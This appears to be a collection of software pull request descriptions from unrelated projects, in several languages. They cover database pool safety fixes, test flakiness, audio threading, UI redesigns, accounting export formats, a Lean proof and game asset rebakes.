author: tzachish
body:
Part of epic #92: the fix wave of the final whole-branch review, before the 5.0.0 release. No version bump: package.json stays 4.7.0 and the CHANGELOG heading stays "(unreleased)".

## Fixes in src

- **Unsafe escaping under `NO_BACKSLASH_ESCAPES` is closed** (your decision: "Check first"). The pool now tracks the mode per connection as unknown, on or off. It is unknown on a new connection and after every reset. A `query()` that writes values into the text, on a connection whose mode is unknown, first sends one `DO 0` and reads its OK header. If the mode is on, the call is refused with `MDC_UNSAFE_SQL_MODE` and the statement is never sent. `execute()` and calls without values never send it. The cost is one command per connection per reset, only on that path.
- **Broken connections are closed with their socket.** A connection given up after a timeout, and an aged idle one, now go through `drop()` (connection and socket) instead of mysql2's `destroy()`, which only ends the stream. A silently cut path no longer keeps the socket, or the process, alive.
- **The probe loop stops on a node that health has given up.** Once the pool's status is no longer valid, the next failed probe ends the borrow with `sent: false`, so the next node is tried. This takes passive health, so it applies only to a node with a `healthCheck` block (after about 6 to 7 probes with that block's defaults). A node on the legacy check keeps the full worst case (`connectionLimit × probeTimeout` plus `connectTimeout`). The docs and CHANGELOG now say so for `query()` as well.
- `multiStatementQuery()` errors go through the dirty rule. A failed `START TRANSACTION` gets a reset, and a 1047 marks the node not ready.
- `queryTimeout` is bounded by the longest timer (2147483647 ms) in the schema, and a per-call `timeout` above it is clamped, in `query()` and `multiStatementQuery()`. A larger value used to fire after 1 ms.
- `resetTimeout` falls back to 1000 ms, as its sibling settings do.
- There is now one `timeoutError()` helper and one `NOT_READY` constant, instead of four and two copies.
- `Pool.query()` no longer uses an `async` Promise executor.
- A constant that shadowed a parameter is renamed.

## Tests, rig and docs

- The Galera suites:
  - node-drops-out counts the call only when the isolated node was asked first, and fails clearly when the check removed the node first;
  - a stale rig lock is taken over under a second lock;
  - the dead-connection INSERT is bounded;
  - every `afterAll` cleanup step runs even when one fails;
  - `bound-values` has a new row: `NO_BACKSLASH_ESCAPES` set globally, then a new connection, and `query()` with values is refused.
- `tests/rig/galera.sh`: `down` kills a pid only while it is still that node's run, and `up` says how to go on when it refuses an env file.
- Docs:
  - CHANGELOG: an error reply costs a reset; the probe's time cost; the `queryTimeout` bound.
  - The pool and redis docs link `Pool.ts` by method, not by stale line numbers.
  - A known-issues entry for `Borrow._leaveQueue`, which reads a private field of mysql2.
  - CLAUDE.md routes `execute()`, the retry rule, `Borrow` and `SessionState`, and its indent line says 4 spaces.
  - Smaller corrections in the README and docs/testing.md.

## Checks

- Full `npx jest`: 65 suites passed, 6 skipped (gated Galera) and 4 failed. The 4 are the known stale suites, which fail to compile. 2418 tests passed and 107 were skipped. The base 02eca8b has 2402 passing and 106 skipped. The difference is 16 new tests and 1 new gated test, and nothing failed.
- Rig: three runs in a row, each from a fresh `up` to `down`, passed 107 of 107. Each run took about 53 s to come up, 24 s of jest and 3 s to come down. Nothing of the rig was left after.
- `npm run build` exits 0. `git diff --check` is clean. No added src or test line is over 100 characters.

## Review

A scoped re-review found all 21 findings addressed, with no new Critical or Important issue. Its three Minor items:
- two doc wording gaps, fixed in f9fda35 and 663e959;
- one low-confidence edge, parked: hashing setup borrows from the first pool even when that pool was never valid.

Parked until after 5.0.0, as rulings:
- extracting the send step of `Pool.query()`;
- a silent `escapeNamedValues` passed by JavaScript callers;
- three unused names from before the epic;
- a reset that the server answers with an error is taken as done;
- no lower bound on `queryTimeout`;
- a ROLLBACK sent after a 1047 inside `multiStatementQuery()`.

_Requested by **Juan Pablo** · [project thread](https://claude.ai/code/project/chan_01Gog76v7D67y7EaFzctCD8w?thread=cmsg_01Gog76v7D67y7EaFzctCD8wUEAjD92DXBcYRjkekwjXCM)_

## Summary

`main` is red since #67 landed (b06e04f): both test legs fail `test_oneshot.py`'s `test_rate_limit_waits_for_retry_after_and_says_so` with `148 != 1` / `297 != 1`. It passed on #67's own head, so it is timing-dependent.

**Root cause.** The test patched `sleep` on the shared `time` module and asserted one call. During the run, `diff_base` looks up the PR base with `gh pr view` under `subprocess.run(..., timeout=10)`. When the child closes its pipes before it exits, subprocess's `wait(timeout)` polls `time.sleep`, and with the sleep mocked to a no-op that poll spins, so the count includes subprocess's polls. CI has `gh`, which is why it shows there and not in a container without it.

**Fix (test only).** The test swaps `oneshot`'s own `time` name for a `Mock(wraps=time)` whose `sleep` is the mock, so only oneshot's retry sleep is counted. The other two tests that patch `oneshot.time.sleep` don't hit a subprocess or don't count calls, so they're unchanged.

No version bump: only a test file changes, and nothing an installed plugin runs is touched.

## Verification

- Reproduced locally with a fake `gh` that prints to stderr, closes its pipes, then sleeps 0.3s: `AssertionError: 66045 != 1` before the change, `OK` after.
- `test_oneshot.py` passes with and without the fake `gh`; `python3 scripts/run-tests.py` passes all 35 suites; ruff and `check-marketplace.py` are clean.
- No gate chain ran: the sdlc and grumpy plugins aren't installed in this cloud session. Classified small (one test file, no shipped behaviour).

## Summary

```diff
- Voice startup and in-call refresh scan audio devices on the session runtime
+ Run both scans on a background thread so microphone, Voice Output, and Channel Radio keep flowing
+ Apply current mute and deafen intent before resuming the microphone after reconnect

- Both participant volume labels share a GPUI accessibility ID
+ Give Mic volume and Screen Share volume distinct IDs
```

## Evidence

- In a 30-second Windows comparison, dropped microphone and incoming voice blocks went from 249 and 227 to zero. The longest Channel Radio refill gap fell from 158 ms to 35 ms. A live call with a web participant confirmed clear audio in both directions and clear Radio playback while muted.
- The reconnect regression paused the device scan and issued Mute. The previous code resumed the microphone once. The fix kept it muted.
- A Windows accessibility probe reproduced the duplicate-node panic before the fix and found both volume labels afterward. The participant volume dialog also opened successfully in the live app.
- The final Windows build passed 118 tests, with seven ignored. Linux `cargo check --locked --offline --tests` passed. Live audio was verified on Windows.

## Merge Danger

**Door** Two-way. A revert restores the previous behavior.

**Blast Radius** Voice. The shared device scan affects voice startup and refresh on desktop platforms. The accessibility change is confined to the participant volume dialog.

author: williamboglietti
body:
## Pourquoi

Dans l'assistant d'installation, les six distributions de l'étape **Systèmes** débordaient dans une barre de défilement native : Rocky restait caché et, sur mobile, le curseur de la barre ressemblait au soulignement de l'onglet actif. L'audit de l'onboarding a aussi relevé une série de petits défauts visuels qui rendaient le parcours moins agréable.

## Ce qui change

**Sélecteur de distributions** (assistant et Paramètres › Systèmes, partial partagé)
- Nouveau composant `app/public/scroll-strip.js` : la barre native est masquée. Du côté où des onglets restent cachés, ils se floutent et s'effacent sous un chevron, avec un halo d'ombre léger.
- L'onglet actif (y compris via `#ancre`) est ramené dans la zone visible, en tenant compte du chargement tardif de la police. Le focus clavier reste hors de la zone de fondu.
- Les flèches sont masquées aux technologies d'assistance et ne prennent jamais le focus : le clavier passe par les onglets.
- À égalité de versions, l'onglet par défaut suit l'ordre du catalogue (Debian en tête) au lieu de l'ordre alphabétique SQL.
- Dans l'assistant, Retour rejoint Continuer dans une barre en pied qui reste visible ; le tableau version × architecture ne déborde plus sur mobile.

**Assistant**
- Le stepper est rendu par le layout ; les pastilles sont reliées par un trait qui passe au vert au fil des étapes. Sur mobile, seul le libellé de l'étape courante reste affiché.
- Le récapitulatif de validation devient un tableau libellé / valeur au lieu d'une liste brute.
- Boutons Retour / Continuer homogènes (flèches partout). « Continuer vers le compte administrateur » devient « Continuer », qui tient sur une ligne. « Commencer » ne prend plus toute la largeur.
- Chevron dessiné pour les sections repliables ; logo PXE Tools sur l'accueil.
- La consigne de l'étape Systèmes passe de quatre phrases à deux.

**Bandeau d'état du HTTP de démarrage** (assistant et console)
- Il ne s'affiche plus que sur **conflit**, le seul cas qui demande une action. Les états libre, en démarrage ou indéterminé restent visibles dans le panneau Services de la Vue d'ensemble et sur `/init/port-80`.

## Points d'attention

- `app/public/style.tailwind.css` est régénérée avec `@tailwindcss/cli` 4.3.3. Le build de `main` a été vérifié comme reproductible à l'identique avant les modifications.
- `test_wizard_image_race_http.py` échoue en local sur macOS (interface `lo` absente, `lo0` à la place), à l'identique sur `main`. La CI Linux le couvre.

## Vérifications

- Rendu vérifié sur chaque étape en desktop et mobile (375 px), thèmes clair et sombre, ainsi que Paramètres › Systèmes et la Vue d'ensemble.
- Comportement du bandeau contrôlé : clic sur les deux flèches, Tab au clavier jusqu'au dernier onglet, ancre `#rocky` au chargement, aucun avertissement console.
- `php tests/unit/test_network_onboarding.php`, `test_wizard_image_race.php`, `test_first_visit_database.php`, `test_overview.php`, `test_device_terminology.php`, `python3 tests/unit/test_port80_diagnostic.py`, `node tests/unit/test_theme.cjs` et `PXE_NETWORK_ONBOARDING_TEST=1 python3 tests/integration/test_network_onboarding_http.py` passent en local.

author: mattshax
body:
Review 1, finding 10, plus two items of finding 21: a failed model move was only logged, and the model note outlived its session.

**Verified.** `llm.Client.failures` was a `map[model]ModelFailure` shared by every person. `enabledModels` (pwcodemodel.go) dropped any model with an entry in the last ten minutes, and `pickPWCodeModel` treated "not listed" as "not offered", so the note said "is not enabled for your AI connection". A new test shows that on main another person's failed call moves the chat.

**Fix.**
- `RecordOutcome(key, id, …)` / `ModelFailure(key, id)`: a model's last outcome is kept per model and per calling credential (8 bytes of a SHA-256 of the key; the key itself is never kept; "" means the gateway's own). `StreamTurn` records with the key it called with.
- The chat reads failures with `callKey`, the key a turn would use (the sidecar's, the person's own, else the gateway's). This applies in the pw code check, the picker's `callable`/`last_error` and the Retry choices.
- `pickPWCodeModel(current, chosen, enabled, failing)`: a model that is offered but failing for this person counts as a reason to move, and a failing model is never the target. The note says "is not enabled for your AI connection" or "failed when you last used it, in the last ten minutes".
- A refused `PATCH settings` now sets a note ("…and the Studio could not move this chat to X: <reason>") and `modelStuck` on the stream event. The chat's notice shows it as a warning titled "pw code could not move this chat to another model". The link keeps the model the session is on.
- PWCodeEngine: the menu's note is the server's note for the current session (`d.modelNote`) rather than `d.modelNote || prev.modelNote`, which kept an old session's note.

Routine calls:
- Per key rather than per person: two people who share the deployment key share its failures, which is right, since it is the same credential. A person's own key is theirs alone.
- The key hash is 8 bytes (16 hex characters): enough to tell keys apart in memory, and the record never holds a key.

Tests (the first two fail on main):
- `llm.TestModelFailuresArePerKey`.
- `TestPWCodeChatModelFailuresArePerKey`: another key's failure leaves the chat where it is; the person's own failure moves it, and the note says it failed, not that it is not enabled.
- `TestPWCodeChatSaysWhenTheModelCannotMove`: a refused PATCH gives `modelStuck` and the note, and the link keeps its model.
- `pickPWCodeModel` cases for failing models.
- web/test/pwcodeEngine.test.tsx: a new session clears the old note, and the stuck notice has its own title.

Docs: HELP.md (pw code), REFERENCE.md (pw code model paragraph).

body:
The plan's order changed on 2026-11-22. #116 had this repo fix every bug first (`v2.0`), then `2.4b6-fixed`, then Charm. Now the fixes start in C:

1. **QuickMUD-Python** (done): renamed (`v1.1`) and left in a good state. The bugs labelled "after cut-over" stay open, unfixed.
2. **`2.4b6-fixed`** (C): what's offered to the ROM community. A visitor can trace the lineage back to Russ Taylor's release, read each fix and why it was made, and decide whether to build a new ROM MUD on it.
3. **Charm** (Python): stock ROM ported, with the same fixes. A visitor can briefly see the fixes made between the C and the Python.
4. **Back here:** decide which fixes this repo takes, the add-ons' included, and what comes after.

## Where this fits

The project's plan, in order, with this PR's part opened up:

- **The refactor in C** ([plans/refactor.md](https://github.com/abraidotti/QuickMUD-Python/blob/master/plans/refactor.md)), #2-#22
- **The tools port** ([plans/tools-port.md](https://github.com/abraidotti/QuickMUD-Python/blob/master/plans/tools-port.md)), #17-#18
- **The Python port** ([plans/python-port.md](https://github.com/abraidotti/QuickMUD-Python/blob/master/plans/python-port.md)), #20-#115 (done)
- **After `v1.0`** (#116):
  - the rename to QuickMUD-Python, `v1.1`, #117 (done)
  - the rename's leftovers, #118 (done)
  - the new order, #120, this PR **( <-- YOU ARE HERE)**
  - [2.4b6-fixed](https://github.com/abraidotti/2.4b6-fixed): stock ROM 2.4b6 with its bugs fixed, in C
  - Charm: a Python port of stock ROM 2.4b6 with the same fixes
  - back here, to decide which fixes this repo takes

## What changed

- `plans/python-port.md`, "After cut-over: three repos": the four steps above, with what each repo offers its visitors, and a note that #116's decisions 5 to 7 and #119 are superseded.
- `README.md`: the intro and the roadmap line no longer say "next, every bug filed here is fixed".
- `CLAUDE.md`: the plan paragraph says the same, and that the bugs filed here aren't to be fixed yet.

## Proof

Docs only, so no behaviour change.

- `test_guards.py`, which checks the licence headers that point into the README: 10 tests OK.
- After the change, `git grep -n "fix every bug" -- '*.md'` finds nothing.

Alongside this PR:

- #116 is closed as done (the rename), with a comment on the new order.
- #119 is closed as superseded.
- The answered P1 spike issues #28, #30 and #32 are closed.

author: artur-t-96
body:
## Co

Opis faktury kosztowej (E2) i plik Symfonii „szablon 4” wg „Ogólnych założeń” głównej księgowej z 18.11.2026 (decyzja Artura 22.11: budujemy teraz, test z księgową po 25.11). Arkusz i próbki leżą u Artura — w repo, testach i tym opisie nie ma danych firmy.

**Dekret E2** (`finance_ledger/posting.py`, nowy `posting_options.py`):
- Karta faktury → „Dekret do Symfonii FK” → **Opisz do księgowania**: opis księgowy, typ (FVZ, IU, DP, FVZP, WNT, FKZ, FZBO), rejestr (6 z arkusza), konto netto z zespołów 4 i 7, konto VAT (221, 223, 403-302), rejestr i konto VAT należnego (226, 222, 224) z flagami UE / Usługa, konto „5”, „Paliwo i leasingi” z opcjonalnym 999 / 902–903, procedura JPK, data / kurs / tabela NBP, data zakończenia usługi. Puste pole = podpowiedź z reguły.
- Wybory leżą w `decree["choices"]` — **bez migracji**; „Przelicz” i ręczna korekta ich nie gubią.
- **Konta 4 i 7 o rodzaju „inne”** (na produkcji 65 + 202): konto netto pasuje, gdy ma rodzaj „koszt” albo „inne” w zespole 4/7 — bez przestawiania kont; to samo w regułach „Plan kont”. Konto VAT: rodzaj „VAT” albo numer z listy księgowej.
- **Konto brutto z kartoteki**: 201-2-<nr> (krajowy PLN), 203-2-<nr> (zagraniczny), 205-2-<nr> (krajowy w walucie), <nr> = numer Symfonii; konto specjalne z kartoteki (np. leasing) wygrywa.
- **Samochód**: koszt i „5” = netto + ½ VAT, VAT ½ (pierwsza połowa w dół, jak eBI24), rejestr „Zakup” + „Rejestr NP VAT”.
- **Import usług / WNT**: VAT od netto PLN po kursie, Wn 221 / Ma 226, kontrahent = netto, dwa rejestry (naliczony z UE/Usługa, należny), kwoty w walucie i PLN, JPK domyślnie BFK.
- **MK** automatycznie dla faktury z KSeF z adnotacją metody kasowej (`Adnotacje/P_16`, parser FA + `details.cash_method`).
- **Ręczna korekta** z innymi kwotami gubi rejestry i flagę samochodu (nie idą stare połowy do JPK i Symfonii).
- **„5” — decyzja** (zapisana w `docs/claude/finanse-insights/ksiegowosc-opis-faktury-wg-ksiegowej.md`): konto „5” wybrane na karcie = zapis równoległy Wn 5xx / Ma 490 na dokumencie i w pliku; miesięczny PK z `ledger/allocation.py` **pomija** takie faktury (`meta.parallel_lines`), reszta jak dotąd. „Usuń linię „5”” na karcie = faktura wraca do PK. Bez dublowania.

**Szablon 4** (`ledger/export_file._purchase_document`, `ledger/exports.purchase_invoice`):
- Korekta (FKZ) z opisem idzie tym samym układem zakupu z blokiem faktury korygowanej (dwa rejestry korekty samochodu, „5”, JPK); FKZ ze starego dekretu bez zmian.
- Odblokowane **FVZ, FVZP, IU** i waluta obca dla nich (dotąd 422 „typ bez próbki” / „waluta obca”). FVS, WDT, FKZ bez zmian bajt w bajt (stare testy zielone).
- `Transakcja.rachunek` podpięty: ręczny z E3 > z KSeF (rachunek faktora przed sprzedawcą) > z kartoteki; faktury osób zespołu bez rachunku (D2).
- Rejestr VAT księgi (K5): import usług z kolejki kosztów dostaje pole JPK i konto VAT należnego z dekretu, samochód — netto połowy „Zakup”.

## Sprawdzenie na próbkach (lokalnie, bez danych w repo)

Skrypt poza repo: próbka eBI24 → `ExportInvoice`/`ExportLine` → `SymfoniaFkDocuments.render` → diff.

| Próbka | Wynik |
| --- | --- |
| FVZP samochód (PLN, KSeF, 2 rejestry, „5”) | tekst równy próbce po wyzerowaniu `kodKH`, `khid` |
| IU import usług (EUR, tabela NBP, `AtrybutWaluta`, VAT należny, „5”) | tekst równy próbce po wyzerowaniu `kodKH`, `khid` |
| FKZ korekta z 17.11 (z „5”) przez nowy układ korekty z opisem | tekst równy próbce po wyzerowaniu `kodKH`, `khid` (stary układ gubił zapisy „5”) |

Dekret NEXUSA (`posting.compute`) z kwot tych faktur daje te same zapisy i rejestry co eBI24, z dwiema różnicami — pytania 2 i 3 niżej.

## Pytania do księgowej (próbki ich nie rozstrzygają)

1. **`kodKH` / `khid`** dalej puste (jak w K3b) — czy Symfonia dopasuje kontrahenta po NIP?
2. **UE przy imporcie spoza UE**: arkusz mówi „spoza Unii tylko Usługa”, a próbka IU (kontrahent spoza UE) ma `UE =1` w obu rejestrach. NEXUS podpowiada wg arkusza (UE = nie), Finanse mogą zmienić. Które jest dobre?
3. **„5” w imporcie usług**: próbka ma na „5” kwotę o 1 gr niższą niż netto w PLN (eBI24 obcina?). NEXUS daje „5” = netto w PLN. Czy to ma znaczenie?
4. **Samochód w leasingu**: próbka księguje „netto” na koncie zespołu 2 (rozrachunek leasingu), arkusz mówi „konta 4 lub 7”. NEXUS dopuszcza zespół 2 tylko przy „Paliwo i leasingi” — tak?
5. **999 / 902–903**: zwykły zapis (`pozycja =0`) czy zapis równoległy jak „5”? Kwota = ½ brutto, nieparzysty grosz w drugiej połowie.
6. **`dozaplaty =0.00`** w obu próbkach zakupu — zawsze 0 dla FVZ/FVZP/IU?
7. **`IdDlaRozliczen`**: FKZ `1` ze znacznikiem na zapisie rozrachunkowym, FVZP i IU `-1` bez znacznika. FVZ (bez próbki) idzie jak FVZP — dobrze?
8. **FVZ** nie ma próbki — układ jak FVZP (`nazwa =Faktura zakupu`, rejestr „Zakup”). Prośba o jedną próbkę FVZ.
9. **`UE =0`, `usluga =0`**: próbka ma tylko jedynki — czy Symfonia przyjmie zera, czy pole trzeba pominąć?
10. **`JPK_V7`**: czy może mieć kilka oznaczeń naraz (np. MK i BFK) i w jakiej składni?
11. **Tabela NBP**: NEXUS zna kurs z NBP, ale nie numer tabeli — Finanse wpisują go ręcznie. Czy import przejdzie bez `tabela`?
12. **Rachunek** idzie tak, jak na fakturze (z `PL`, ciągiem albo grupami jak w próbkach). Czy format ma znaczenie?
13. **Korekta samochodu**: rejestry „Korekta Zakupu” i „Korekta Zakupu NP. VAT” — tak?
14. **WNT, DP, FZBO** dalej zablokowane w szablonie 4 — prośba o próbki.
15. **Nazwy krajów spoza UE**: znamy tylko „Indie” z próbki, reszta z listy MSZ (Stany Zjednoczone, Wielka Brytania, Szwajcaria…). Czy Symfonia ma własną kartotekę krajów?
16. **FVZ w walucie od dostawcy krajowego (205)**: bez próbki — nagłówek w walucie i `wkwota` w PLN jak w IU?
17. **„5” zawsze na dokumencie?** Jeśli tak, PK rozliczenia kosztów w NEXUSIE można wyłączyć; dziś zostaje dla faktur bez wybranego „5”.
18. **Korekta in plus z opisem**: nagłówek ze znakiem minus jak faktura (reguła z próbek), a stary układ FKZ pisał kwoty dodatnie — który?
19. **MK** NEXUS zna tylko z faktur kontraktorów (jedyne koszty z XML-em KSeF); przy dokumentach z PDF Finanse wybierają ręcznie — wystarczy?

## Testy

- Backend bez bazy: `tests/test_finance_posting_description_rules.py` (nowy: samochód, korekta samochodu, IU spoza UE i z UE, WNT, korekta importu, import w PLN, waluta z kursem z karty, brak kursu, „5” i brak 490 w planie, konto spoza planu / wyłączone, konta 4/7 „inne”, konto spoza 4/7, konto brutto 201/203/205/leasing, MK, data usługi, odmowy wyborów, ręczna korekta), `tests/test_ledger_symfonia_purchase_export.py` (nowy: pełny tekst FVZP i IU na zmyślonych fakturach, UE, korekta, MK, waluta bez kursu i ze starym dekretem, dane z dekretu), dotychczasowe testy E2 i szablonu 4 — lokalnie 390 zielonych.
- Front: `DecreePanel.test.tsx` (widok rejestrów i JPK, formularz z importem usług, waluta), `posting-model.test.ts`; `npm run type-check`, eslint, `src/__tests__/` (336) zielone.
- Testy z bazą (bramki, karta, eksport) — CI.

## Plan testów

- [ ] CI: sito + pełny bieg w kolejce
- [x] Staging 1280 × 720 (backend i front z gałęzi na kopii produkcji z 19.11, konto Finansów): `GET /choice-lists` na prawdziwym planie — 184 konta netto z zespołów 4/7 o rodzaju „inne”, 202 konta „5”, 7 kont 902–903; wpis 4847 → „Przyjmij” → „Opisz do księgowania” (konto „5”, MK) → dekret 402-203 / 221 / rozrachunek + zapis równoległy 501-… / 490, rejestr „Zakup 23%”; wpis 4851 → IU + samochód → trzy wady z powodem (kontrahent z Polski, samochód z importem, VAT od sprzedawcy); bez poziomego przewijania. Zrzuty z danymi osób w prywatnym artefakcie, nie w repo.
- [ ] Po 25.11: import pliku z NEXUSA w Symfonii z księgową (decyzja Artura)

## 変更
手を進める・戻るボタンの並びに、10 手戻る・10 手進むを足す。文字は出さずアイコンで示し、名前（「10 手戻る」など）は読み上げとツールチップに使う。

| 画面 | 並び | アイコン |
|---|---|---|
| 研究ノート（PC・タブレット） | 最初 / ≪ / 1 手戻る / 手数 / 1 手進む / ≫ / 最後 | 1 手の山形に合わせた二重の山形 |
| 棋譜欄のツールバー（解析・観戦の PC、終局後の PC の対局画面、オンライン対局） | ⏮ / ◀◀ / ◀ / 手数 / ▶ / ▶▶ / ⏭ | 1 手の塗りつぶした三角に合わせ、三角を 2 つ重ねた形 |

- 棋譜欄では、分岐ビューで選んでいる分岐を、1 手進むと同じ道筋で 10 手たどる（`useKifuNavigation.goForwardBy` / `goBackBy`）。
- オンライン対局では、最新の局面まで進んだら、1 手進むと同じくライブの追従に戻る。
- 研究ノートは、表示している手順の上で手数を ±10 する（端で止まる）。
- 定跡ビュアー（木なので「10 手進む」の行き先が決まらない）と、読み筋のプレビューは今回は触らない。

- 開発サーバー（Chrome、PC 幅）: 研究ノートで 30 手の棋譜を 10 手ずつ進めて戻した（0 → 10 → 20 → 10）。対局画面で 12 手指して投了し、終局後のツールバーで 12 → 2 手目に戻した。

author: evilclanker9000
body:
Claimed in the coordination issue as: [Preserve the deadline of an issued PresentX token](https://github.com/ItsNotRexed/Leonida/issues/2078#issuecomment-7081710145)

### What and why

A frame is due at the vblank following the origin that issued its token. After a call to `ScheduleFrameEventX` with a new offset, the old code used the new offset to recalculate the already-issued token's deadline. That could select the wrong present mode and report the wrong scan percentage.

Store the due time when the token is issued, then use that time for both the late-present decision and the display statistic.

### Tested

- Windows, MSVC 19.44, CPU-only manual-clock fixture. On main, `frame_pacer` reported the old token late at its exact vblank after the offset changed.
- With the fix, `ctest --test-dir build-review --output-on-failure -R '^frame_pacer$'` passed. The fixture sees zero lateness at the original vblank, 4 ms later selects an immediate present under the 30% threshold, and records a 25% scan position at the flip.
- `python -B -I tests/test_ctest_registration.py` passed all four tests.

AI-assisted.

### Checklist

- [x] No game data, keys or decryption (CONTRIBUTING.md), including in logs or reports quoted here.
- [ ] A new translator rule is in the contract table of `docs/design.md`, with how it was confirmed. (Not applicable.)

author: viviencabannes
body:
## Summary

Proves `MetaMathlibExt.abs_log_one_add_lt_and_abs_lt_exp_sub_one`, Lemma 6 of Bachabi, Kourouma and Togbé, *On k-Pell-Lucas Numbers Close to a Power of 2* (INTEGERS 25 (2025), Article A67): if `0 < a < 1` and `0 < |x| < a`, then `|log(1 + x)| < (-log(1 - a) / a) |x|` and `|x| < (a / (1 - e^{-a})) |e^x - 1|`. The theorem moves, with the same name and statement, from `WantedExt.NumberTheory.KPellLucasCloseToPowerOfTwoWanted`, which keeps the paper's other statements and now names the proved module, to the new module `MathlibExt.NumberTheory.KPellLucasCloseToPowerOfTwo`, with the restated docstring that its wiki page already follows. Both constants exceed 1, which settles `x > 0` through `log(1 + x) < x` and `x < e^x - 1`; for `x < 0`, the strict concavity of `log` on `(0, ∞)` and the strict convexity of `exp`, applied with the weight `-x / a`, give the two bounds. `MathlibExtTest.NumberTheory.KPellLucasCloseToPowerOfTwo` tests the case `a = 1 / 2` (constants `2 log 2` and below `3 / 2`), a negative point, and the case `x = 0` that the hypothesis `x ≠ 0` excludes. Provenance rows record the changed wanted file and the new module, `scripts/taxonomy.json` places the new module beside the wanted one, and `scripts/wiki-sync.json` takes the new docstring's digest.

Task: wiki article `af_0ab9ac0410756da885baf48e` (Linear bounds for the logarithm and the exponential near zero (Lemma 6)), declaration `MetaMathlibExt.abs_log_one_add_lt_and_abs_lt_exp_sub_one`, ready to prove in the wiki's task list.

Rebake Interlude terrain and water in a worktree off current `dev`, for #1685, #1686, #1687, #1689, and #1698.

## What landed
- TI shoreline tiles `16_26`, `17_26`, `18_25`, and `18_26` (`RunTerrainExitCli`: scenes, meshes, brushes, `EditorBuildSettings`).
- All 41 in-repo tiles reconverted with `L2TerrainMeshCli.RunCli` (official hole cuts and layer/alphamap arrays). `convertDecoLayer` is still `false`, so `*_DecoLayer.prefab` instances were **not** rescattered; #1687 placement code is on `dev` but this PR does not refresh deco placement.
- 202 official Height alphamap PNGs exported from Interlude `T_*.utx` packages (all present except `T_themepark.utx`).
- Official WaterVolume quads rebuilt into `StaticMeshes.prefab`: **134 quads on 37 tiles**. The water CLI still reads Meta `watervolumes.json` `{name,min,max}` + material. After #1728, `.unr` dumps include brush geometry; that did not change this reader, and a confirmation bake on the #1728 tree still produced the same 134/37 surfaces (e.g. `21_23/WaterVolume1` at y=-72.00).
- Shared pipeline: LogError and skip `Texture2DArray` generation when a source texture is missing (so one bad tile does not abort the batch); cap overlay arrays to the shader's 9 splat slices; write splat `_Splatmaps` arrays **without mipmaps** so official 1K masks stay under GitHub's 100MB file cap (largest here: `20_17` / `22_23` at 88MB). Diffuse `_Layers` arrays stay mipmapped.
- Clean-Library compile unblockers that were still needed on this tree: `using System;` on eight `NetCodec` files that use `ReadOnlySpan`, and broken string escapes in `AnimNotifySoundResolver` / `CharacterCombatAudioDispatch`. EditMode test moves are already on `dev` via #1730.

No original binaries (`.unr`/`.utx`/`.usx`/`.ukx`/`.u`) and no unrelated `.meta` churn. There is no terrain screenshot CLI; no editor before/after capture is included.

## Bake LogErrors (expected / still open)

- **Splat cap 9 overlays**: `16_25` (11 layers), `20_17` (12), `22_21` (11), `22_23` (12). Extra official layers will not paint until the shader slice count is raised. The 10th overlay on `16_25` also has no alphamap; the cap now keeps that trailing null out of the array so the 9 in-cap slices still write.
- **`17_24`**: no `Meta/17_24.t3d`, so no `StaticMeshes.prefab` and no water quads.
- **`22_21`**: no `Meta/watervolumes.json` (no water quads for that tile).
- Many official deco `StaticMesh` refs are missing (parser LogError). Mesh CLI does not scatter deco.
- Pre-existing missing prefab guid `bbd2c98b3b396b14e8a900a68be2f8ae` (`de_fire`) when opening some `StaticMeshes` prefabs.
- Shader Graph `TerrainAlphamapDouble` is still assigned; Metal warnings about a 5-parameter `L2_TerrainLayerUv` overload in `TerrainLayerModulate2X` / `TerrainBaseModulate2X` remain from earlier sessions.

body:
## What and why

Brings the four goal modals in line with proposal v6 (`m-goals`), all on the v2 `AppModal` frame at 440 px.

- **Nouvel objectif / Modifier l’objectif:** Nom, then « Montant cible » (right-aligned) and « Échéance (facultative) » side by side in a `ModalFieldRow`, then « Image (facultative) » with the 36 × 24 thumbnail, « Choisir une image » (`image` icon) and ghost « Retirer ». The « Facultative » helpers are gone. Spec and mockup both make the deadline a month (`11-goals.md`: « facultative, a month »; mockup shows `06/2026`), so the field now reads `MM/AAAA`, typed or picked from a calendar that opens on its year view. It stores the first day of that month; the panel only ever shows the month. A refused image file now shows as the field's error instead of a banner.
- **Nouvelle allocation:** the goal’s name as lead. Montant (right-aligned, helper « Un montant négatif retire de l’objectif. »), Date and « Note (facultative) » (placeholder « Ex. Virement mensuel ») one under the other at full width, where before Montant and Date shared a row.
- **Supprimer l’allocation du 1er mai 2026 ?:** the title names the line’s date, with « 1er » for the first of the month in French. The lead names the goal (« Le montant mis de côté pour « … » baisse / remonte de … »). `AppModalKind.destructive` (focus on « Annuler »), solid destructive button, no body.
- **Recadrer l’image:** already matched v6. The 440 px width and the 392 × 169 (44:19) full-body-width window now come from `AppModalSizes` tokens.
- The goal form and the allocation form now use the frame's `dirty`, `busy`, `saveError`, `onSubmit` and `AppModalCancel` in place of their own banner and cancel buttons. Unused ARB keys were removed (`goalFormDateHelp`, `goalFormImageHelp`, `allocationCancel`, `goalAllocationDeleteCancel`).

Not in proposal v6, so noted rather than invented:
- The empty deadline field has the placeholder `MM/AAAA` / `MM/YYYY` and the validation message « Saisissez un mois au format MM/AAAA. ». Both follow the existing declared-history month field.
- Proposal v6 has no « Modifier l’objectif » mockup, so the edit form uses the create layout with the existing title. Goals have no delete (archiving only), so the edit form has no ghost « Supprimer ».

Closes #274

## How to test

- `flutter analyze`: no issues. `dart format`: clean.
- `flutter test`: full suite green (1604 tests).
- `uv run pytest tests/test_version.py` (backend): 3 passed.
- New or updated widget tests: the goal form layout (field row aligned by input, labels, right-aligned target, no « Retirer » without an image), the deadline typed or picked as a month, a non-month refused, editing loads `06/2028`, cancelling a dirty form asks first. The allocation modal in both themes (lead, stacked full-width fields, helper, placeholder), a signed withdrawal submitted, zero refused, the dirty cancel, English copy. The delete title and lead in fr and en, and focus on « Annuler ». The crop step: 440 px frame, 392 px window at 44:19, no round guide, copy in fr and en.
- Manually: Objectifs → « Nouvel objectif », a goal’s « Modifier », « Allouer », an allocation row’s delete, and « Changer » → choose an image, in both themes and both locales.

